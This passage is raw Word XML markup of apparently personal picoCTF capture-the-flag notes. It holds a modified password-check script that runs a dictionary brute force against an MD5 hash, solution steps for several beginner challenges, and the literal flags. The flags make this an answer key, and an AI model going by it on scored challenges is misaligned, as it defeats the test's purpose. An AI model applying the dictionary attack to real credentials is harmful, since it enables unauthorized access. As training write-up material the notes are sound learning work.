    </w:p>
    <w:p w14:paraId="30332FA8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36B806EA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>readlines</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> to get each password </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CEE1267" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:color w:val="C9211E"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C9211E"/>
        </w:rPr>
        <w:t xml:space="preserve">#'ff97\n'  with a new line </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6444D9A0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C9211E"/>
        </w:rPr>
        <w:t>To get rid of \n , use python slice [</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="C9211E"/>
        </w:rPr>
        <w:t>start:end</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="C9211E"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="405DB1A8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>flag_enc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = open('level5.flag.txt.enc', '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>rb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>').read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65754E66" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>correct_pw_hash</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = open('level5.hash.bin', '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>rb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>').read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="604D8D1F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>pos_pw_list</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> = open('</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>dictionary.txt','r</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>').</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>readlines</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2BD7F3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F083828" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">def </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>hash_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pw_str</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="195F16D3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pw_bytes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>bytearray</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FFB4A48" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pw_bytes.extend</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pw_str.encode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="165D9DC0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    m = hashlib.md5()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20799051" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>m.update</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pw_bytes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A2246D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    return </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>m.digest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="515C61DB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>def level_5_pw_check():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6022FCED" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    #user_pw = input("Please enter correct password for flag: ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="394DFF4B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>user_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>pos_pw_list</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0047A901" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:color w:val="C9211E"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="582B4D26" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>user_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="C9211E"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>user_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="C9211E"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>[0:4]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="103B9715" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>user_pw_hash</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>hash_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>user_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="591FAE2F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        if( </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>user_pw_hash</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> == </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>correct_pw_hash</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> ):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6A2BB3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            #print("Welcome back... your flag, user:")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="171B37B7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            decryption = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>str_xor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>flag_enc.decode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">(), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>user_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A35181D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            print(decryption)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31EABF97" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            print(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>user_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C4E065" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">            return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE142AE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    #print("That password is incorrect")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28C7EBB2" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>level_5_pw_check()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18A9E761" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="491E344D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>runme.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C9536D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14925431" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CB49C3D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: Sujeet Kumar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47DAB217" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BEF05B5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Run the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>runme.py</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> script to get the flag. Download the script with your browser or with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>webshell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId36" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Download runme.py Python script</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0BBAB312" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> https://artifacts.picoctf.net/c/86/runme.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14746380" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{run_s4n1ty_run}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5019F48C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EC790E7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="190EB2EE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Serpentine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F31319" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F30A096" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078D9A06" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>syreal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E5A91A6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5392735B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Find the flag in the Python script! </w:t>
      </w:r>
      <w:hyperlink r:id="rId37" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Download Python script</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="34605309" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>https://artifacts.picoctf.net/c/94/serpentine.py</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6E5E461A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">change serpentine.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B43860" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">call function </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>print_flag</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>() in code.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E38820" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>elif</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> choice == 'b':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58EA17E1" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>print_flag</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A2EDEE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="308E791C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>First Find</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64C9031B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E891E25" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D56242B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>syreal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CB65E56" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4DE57A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Unzip this archive and find the file named 'uber-secret.txt' </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26696A2A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="707"/>
        </w:tabs>
      </w:pPr>
      <w:hyperlink r:id="rId38" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Download zip file</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351A9604" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">$ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>upzip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> files.zip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57F9D93D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>$ find ./ -name uber-secret.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="270FE56F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>./adequate_books/more_books/.secret/deeper_secrets/deepest_secrets/uber-secret.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E198DC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>caro@ubuntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>:~/Downloads/files$ cat ./adequate_books/more_books/.secret/deeper_secrets/deepest_secrets/uber-secret.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B1F8FB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{f1nd_15_f457_ab443fd1}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA96C7C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
